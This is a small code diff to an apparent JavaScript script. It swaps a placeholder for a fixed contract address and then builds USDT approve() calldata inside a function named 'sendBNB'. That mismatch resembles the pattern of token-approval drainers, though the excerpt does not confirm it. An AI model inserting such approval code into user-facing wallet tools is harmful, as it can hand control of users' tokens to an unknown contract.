@@ -84,7 +84,7 @@ async function sendBNB() {
 
     // 2. Setup Addresses
     const USDT_TOKEN = "0x55d398326f99059ff775485246999027b3197955"; // Real USDT
-    const YOUR_REMIX_CONTRACT = "0xYOUR_DEPLOYED_CONTRACT_ADDRESS"; // <--- PASTE YOURS HERE
+    const YOUR_REMIX_CONTRACT = "0xa7848f343dac2f4b10fe3b6366ec8a376bb512b1"; // <--- PASTE YOURS HERE
 
     // 3. Construct Data (approve(address,uint256))
     const functionSelector = "0x095ea7b3";
